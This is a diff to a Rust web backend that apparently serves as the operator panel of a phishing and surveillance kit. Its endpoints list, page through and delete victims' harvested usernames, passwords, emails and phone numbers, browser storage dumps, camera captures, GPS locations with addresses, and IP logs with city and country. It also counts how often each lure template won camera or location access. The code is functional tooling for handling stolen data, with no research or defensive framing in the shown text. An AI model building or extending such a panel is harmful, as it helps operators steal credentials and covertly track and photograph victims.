@@ -2,7 +2,7 @@ use crate::AppState;
 use axum::extract::{Path, Query, State};
 use axum::http::header;
 use axum::http::StatusCode;
-use axum::response::{IntoResponse, Response};
+use axum::response::Response;
 use axum::Json;
 use serde::{Deserialize, Serialize};
 use std::sync::Arc;
@@ -17,6 +17,8 @@ pub struct Stats {
     total_size_mb: f64,
     first_capture: Option<i64>,
     last_capture: Option<i64>,
+    total_credentials: i64,
+    total_storage_dumps: i64,
 }
 
 #[derive(Serialize)]
@@ -36,8 +38,10 @@ pub struct CaptureQuery {
     page: i64,
     #[serde(default = "default_per_page")]
     per_page: i64,
+    #[allow(dead_code)]
     search: Option<String>,
     sort: Option<String>,
+    session: Option<String>,
 }
 
 fn default_page() -> i64 { 1 }
@@ -59,6 +63,7 @@ pub struct LocationRow {
     latitude: f64,
     longitude: f64,
     accuracy: Option<f64>,
+    address: Option<String>,
     created_at: i64,
     maps_url: String,
 }
@@ -72,6 +77,8 @@ pub struct IpRow {
     device: Option<String>,
     browser: Option<String>,
     os: Option<String>,
+    city: Option<String>,
+    country: Option<String>,
     created_at: i64,
 }
 
@@ -90,6 +97,9 @@ pub struct TemplateInfo {
     id: String,
     name: String,
     description: Option<String>,
+    total_served: i64,
+    total_camera_grants: i64,
+    total_location_grants: i64,
     created_at: i64,
 }
 
@@ -124,10 +134,16 @@ pub async fn get_stats(State(state): State<Arc<AppState>>) -> Result<Json<Stats>
         sqlx::query_as("SELECT MIN(created_at), MAX(created_at) FROM captures")
             .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
 
+    let total_credentials: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM credentials")
+        .fetch_one(&state.pool).await.unwrap_or(0);
+    let total_storage_dumps: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM storage_dumps")
+        .fetch_one(&state.pool).await.unwrap_or(0);
+
     Ok(Json(Stats {
         total_captures, total_locations, total_ips, unique_ips,
         total_size_bytes, total_size_mb: (total_size_bytes as f64) / 1_048_576.0,
         first_capture, last_capture,
+        total_credentials, total_storage_dumps,
     }))
 }
 
@@ -135,22 +151,36 @@ pub async fn list_captures(
     State(state): State<Arc<AppState>>,
     Query(q): Query<CaptureQuery>,
 ) -> Result<Json<PaginatedCaptures>, StatusCode> {
-    let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM captures")
-        .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
-
     let offset = (q.page - 1).max(0) * q.per_page;
-    let order = match q.sort.as_deref() {
-        Some("oldest") => "created_at ASC",
-        Some("largest") => "file_size DESC",
-        Some("smallest") => "file_size ASC",
-        _ => "created_at DESC",
+    let (total, rows) = if let Some(session) = &q.session {
+        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM captures WHERE session_id = ?")
+            .bind(session).fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        let rows: Vec<(String, String, String, String, i64, i64)> = match q.sort.as_deref() {
+            Some("oldest") => sqlx::query_as("SELECT id, session_id, filename, file_type, file_size, created_at FROM captures WHERE session_id = ? ORDER BY created_at ASC LIMIT ? OFFSET ?")
+                .bind(session).bind(q.per_page).bind(offset).fetch_all(&state.pool).await,
+            Some("largest") => sqlx::query_as("SELECT id, session_id, filename, file_type, file_size, created_at FROM captures WHERE session_id = ? ORDER BY file_size DESC LIMIT ? OFFSET ?")
+                .bind(session).bind(q.per_page).bind(offset).fetch_all(&state.pool).await,
+            Some("smallest") => sqlx::query_as("SELECT id, session_id, filename, file_type, file_size, created_at FROM captures WHERE session_id = ? ORDER BY file_size ASC LIMIT ? OFFSET ?")
+                .bind(session).bind(q.per_page).bind(offset).fetch_all(&state.pool).await,
+            _ => sqlx::query_as("SELECT id, session_id, filename, file_type, file_size, created_at FROM captures WHERE session_id = ? ORDER BY created_at DESC LIMIT ? OFFSET ?")
+                .bind(session).bind(q.per_page).bind(offset).fetch_all(&state.pool).await,
+        }.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        (total, rows)
+    } else {
+        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM captures")
+            .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        let rows: Vec<(String, String, String, String, i64, i64)> = match q.sort.as_deref() {
+            Some("oldest") => sqlx::query_as("SELECT id, session_id, filename, file_type, file_size, created_at FROM captures ORDER BY created_at ASC LIMIT ? OFFSET ?")
+                .bind(q.per_page).bind(offset).fetch_all(&state.pool).await,
+            Some("largest") => sqlx::query_as("SELECT id, session_id, filename, file_type, file_size, created_at FROM captures ORDER BY file_size DESC LIMIT ? OFFSET ?")
+                .bind(q.per_page).bind(offset).fetch_all(&state.pool).await,
+            Some("smallest") => sqlx::query_as("SELECT id, session_id, filename, file_type, file_size, created_at FROM captures ORDER BY file_size ASC LIMIT ? OFFSET ?")
+                .bind(q.per_page).bind(offset).fetch_all(&state.pool).await,
+            _ => sqlx::query_as("SELECT id, session_id, filename, file_type, file_size, created_at FROM captures ORDER BY created_at DESC LIMIT ? OFFSET ?")
+                .bind(q.per_page).bind(offset).fetch_all(&state.pool).await,
+        }.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+        (total, rows)
     };
-
-    let rows: Vec<(String, String, String, String, i64, i64)> = sqlx::query_as(
-        &format!("SELECT id, session_id, filename, file_type, file_size, created_at FROM captures ORDER BY {} LIMIT ? OFFSET ?", order)
-    )
-    .bind(q.per_page).bind(offset)
-    .fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
 
     let captures: Vec<CaptureRow> = rows.into_iter().map(|(id, session_id, filename, file_type, file_size, created_at)| {
         let url = format!("/api/captures/{}/file", id);
@@ -228,27 +258,43 @@ pub async fn delete_all_captures(State(state): State<Arc<AppState>>) -> Result<S
     Ok(StatusCode::NO_CONTENT)
 }
 
-pub async fn list_locations(State(state): State<Arc<AppState>>) -> Result<Json<Vec<LocationRow>>, StatusCode> {
-    let rows: Vec<(String, String, f64, f64, Option<f64>, i64)> = sqlx::query_as(
-        "SELECT id, session_id, latitude, longitude, accuracy, created_at FROM locations ORDER BY created_at DESC LIMIT 200"
-    ).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+#[derive(Deserialize)]
+pub struct ListQuery {
+    session: Option<String>,
+    offset: Option<i64>,
+    limit: Option<i64>,
+}
 
-    let locations: Vec<LocationRow> = rows.into_iter().map(|(id, session_id, lat, lon, acc, created_at)| {
+pub async fn list_locations(
+    State(state): State<Arc<AppState>>,
+    Query(q): Query<ListQuery>,
+) -> Result<Json<Vec<LocationRow>>, StatusCode> {
+    let rows = if let Some(session) = &q.session {
+        sqlx::query_as::<_, (String, String, f64, f64, Option<f64>, Option<String>, i64)>(
+            "SELECT id, session_id, latitude, longitude, accuracy, address, created_at FROM locations WHERE session_id = ? ORDER BY created_at DESC LIMIT 200"
+        ).bind(session).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
+    } else {
+        sqlx::query_as::<_, (String, String, f64, f64, Option<f64>, Option<String>, i64)>(
+            "SELECT id, session_id, latitude, longitude, accuracy, address, created_at FROM locations ORDER BY created_at DESC LIMIT 200"
+        ).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
+    };
+
+    let locations: Vec<LocationRow> = rows.into_iter().map(|(id, session_id, lat, lon, acc, address, created_at)| {
         let maps_url = format!("https://www.google.com/maps/place/{},{}", lat, lon);
-        LocationRow { id, session_id, latitude: lat, longitude: lon, accuracy: acc, created_at, maps_url }
+        LocationRow { id, session_id, latitude: lat, longitude: lon, accuracy: acc, address, created_at, maps_url }
     }).collect();
 
     Ok(Json(locations))
 }
 
 pub async fn list_ips(State(state): State<Arc<AppState>>) -> Result<Json<IpStats>, StatusCode> {
-    let rows: Vec<(String, String, String, Option<String>, Option<String>, Option<String>, Option<String>, i64)> =
+    let rows: Vec<(String, String, String, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, i64)> =
         sqlx::query_as(
-            "SELECT id, session_id, ip_address, user_agent, device, browser, os, created_at FROM ip_logs ORDER BY created_at DESC LIMIT 500"
+            "SELECT id, session_id, ip_address, user_agent, device, browser, os, city, country, created_at FROM ip_logs ORDER BY created_at DESC LIMIT 500"
         ).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
 
-    let entries: Vec<IpRow> = rows.into_iter().map(|(id, session_id, ip_address, user_agent, device, browser, os, created_at)| {
-        IpRow { id, session_id, ip_address, user_agent, device, browser, os, created_at }
+    let entries: Vec<IpRow> = rows.into_iter().map(|(id, session_id, ip_address, user_agent, device, browser, os, city, country, created_at)| {
+        IpRow { id, session_id, ip_address, user_agent, device, browser, os, city, country, created_at }
     }).collect();
 
     let total = entries.len() as i64;
@@ -263,8 +309,13 @@ pub async fn list_ips(State(state): State<Arc<AppState>>) -> Result<Json<IpStats
 }
 
 async fn get_breakdown(pool: &sqlx::SqlitePool, col: &str) -> serde_json::Value {
-    let query = format!("SELECT {}, COUNT(*) as cnt FROM ip_logs WHERE {} IS NOT NULL GROUP BY {} ORDER BY cnt DESC", col, col, col);
-    let rows: Result<Vec<(Option<String>, i64)>, _> = sqlx::query_as(&query).fetch_all(pool).await;
+    let query = match col {
+        "device" => "SELECT device, COUNT(*) as cnt FROM ip_logs WHERE device IS NOT NULL GROUP BY device ORDER BY cnt DESC",
+        "browser" => "SELECT browser, COUNT(*) as cnt FROM ip_logs WHERE browser IS NOT NULL GROUP BY browser ORDER BY cnt DESC",
+        "os" => "SELECT os, COUNT(*) as cnt FROM ip_logs WHERE os IS NOT NULL GROUP BY os ORDER BY cnt DESC",
+        _ => return serde_json::json!({}),
+    };
+    let rows: Result<Vec<(Option<String>, i64)>, _> = sqlx::query_as(query).fetch_all(pool).await;
     match rows {
         Ok(data) => serde_json::json!(data.into_iter().map(|(k, v)| (k.unwrap_or_default(), v)).collect::<std::collections::HashMap<_, _>>()),
         Err(_) => serde_json::json!({}),
@@ -272,12 +323,12 @@ async fn get_breakdown(pool: &sqlx::SqlitePool, col: &str) -> serde_json::Value 
 }
 
 pub async fn list_templates(State(state): State<Arc<AppState>>) -> Result<Json<Vec<TemplateInfo>>, StatusCode> {
-    let rows: Vec<(String, String, Option<String>, i64)> = sqlx::query_as(
-        "SELECT id, name, description, created_at FROM templates ORDER BY name"
+    let rows: Vec<(String, String, Option<String>, i64, i64, i64, i64)> = sqlx::query_as(
+        "SELECT id, name, description, total_served, total_camera_grants, total_location_grants, created_at FROM templates ORDER BY name"
     ).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
 
-    let templates: Vec<TemplateInfo> = rows.into_iter().map(|(id, name, description, created_at)| {
-        TemplateInfo { id, name, description, created_at }
+    let templates: Vec<TemplateInfo> = rows.into_iter().map(|(id, name, description, total_served, total_camera_grants, total_location_grants, created_at)| {
+        TemplateInfo { id, name, description, total_served, total_camera_grants, total_location_grants, created_at }
     }).collect();
 
     Ok(Json(templates))
@@ -380,14 +431,94 @@ pub struct CredentialRow {
     created_at: i64,
 }
 
-pub async fn list_credentials(State(state): State<Arc<AppState>>) -> Result<Json<Vec<CredentialRow>>, StatusCode> {
-    let rows: Vec<(String, String, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, i64)> = sqlx::query_as(
-        "SELECT id, session_id, template_id, username, password, email, phone, ip_address, created_at FROM credentials ORDER BY created_at DESC LIMIT 200"
-    ).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+pub async fn list_credentials(
+    State(state): State<Arc<AppState>>,
+    Query(q): Query<ListQuery>,
+) -> Result<Json<Vec<CredentialRow>>, StatusCode> {
+    let limit = q.limit.unwrap_or(200).min(1000);
+    let offset = q.offset.unwrap_or(0);
+    let rows = if let Some(session) = &q.session {
+        sqlx::query_as::<_, (String, String, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, i64)>(
+            "SELECT id, session_id, template_id, username, password, email, phone, ip_address, created_at FROM credentials WHERE session_id = ? ORDER BY created_at DESC LIMIT ? OFFSET ?"
+        ).bind(session).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
+    } else {
+        sqlx::query_as::<_, (String, String, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, i64)>(
+            "SELECT id, session_id, template_id, username, password, email, phone, ip_address, created_at FROM credentials ORDER BY created_at DESC LIMIT ? OFFSET ?"
+        ).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
+    };
 
     let creds: Vec<CredentialRow> = rows.into_iter().map(|(id, session_id, template_id, username, password, email, phone, ip_address, created_at)| {
         CredentialRow { id, session_id, template_id, username, password, email, phone, ip_address, created_at }
     }).collect();
 
     Ok(Json(creds))
+}
+
+#[derive(Serialize)]
+pub struct StorageRow {
+    id: String,
+    session_id: String,
+    ip_address: Option<String>,
+    data: Option<serde_json::Value>,
+    created_at: i64,
+}
+
+pub async fn list_storage(
+    State(state): State<Arc<AppState>>,
+    Query(q): Query<ListQuery>,
+) -> Result<Json<Vec<StorageRow>>, StatusCode> {
+    let limit = q.limit.unwrap_or(100).min(500);
+    let offset = q.offset.unwrap_or(0);
+    let rows = if let Some(session) = &q.session {
+        sqlx::query_as::<_, (String, String, Option<String>, Option<String>, i64)>(
+            "SELECT id, session_id, data, ip_address, created_at FROM storage_dumps WHERE session_id = ? ORDER BY created_at DESC LIMIT ? OFFSET ?"
+        ).bind(session).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
+    } else {
+        sqlx::query_as::<_, (String, String, Option<String>, Option<String>, i64)>(
+            "SELECT id, session_id, data, ip_address, created_at FROM storage_dumps ORDER BY created_at DESC LIMIT ? OFFSET ?"
+        ).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
+    };
+
+    let dumps: Vec<StorageRow> = rows.into_iter().map(|(id, session_id, data, ip_address, created_at)| {
+        let parsed = data.and_then(|d| serde_json::from_str(&d).ok());
+        StorageRow { id, session_id, ip_address, data: parsed, created_at }
+    }).collect();
+
+    Ok(Json(dumps))
+}
+
+pub async fn delete_credential(
+    State(state): State<Arc<AppState>>,
+    Path(id): Path<String>,
+) -> Result<StatusCode, StatusCode> {
+    let result = sqlx::query("DELETE FROM credentials WHERE id = ?").bind(&id)
+        .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+    if result.rows_affected() == 0 {
+        return Err(StatusCode::NOT_FOUND);
+    }
+    Ok(StatusCode::NO_CONTENT)
+}
+
+pub async fn delete_all_credentials(State(state): State<Arc<AppState>>) -> Result<StatusCode, StatusCode> {
+    sqlx::query("DELETE FROM credentials")
+        .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+    Ok(StatusCode::NO_CONTENT)
+}
+
+pub async fn delete_storage(
+    State(state): State<Arc<AppState>>,
+    Path(id): Path<String>,
+) -> Result<StatusCode, StatusCode> {
+    let result = sqlx::query("DELETE FROM storage_dumps WHERE id = ?").bind(&id)
+        .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+    if result.rows_affected() == 0 {
+        return Err(StatusCode::NOT_FOUND);
+    }
+    Ok(StatusCode::NO_CONTENT)
+}
+
+pub async fn delete_all_storage(State(state): State<Arc<AppState>>) -> Result<StatusCode, StatusCode> {
+    sqlx::query("DELETE FROM storage_dumps")
+        .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+    Ok(StatusCode::NO_CONTENT)
 }
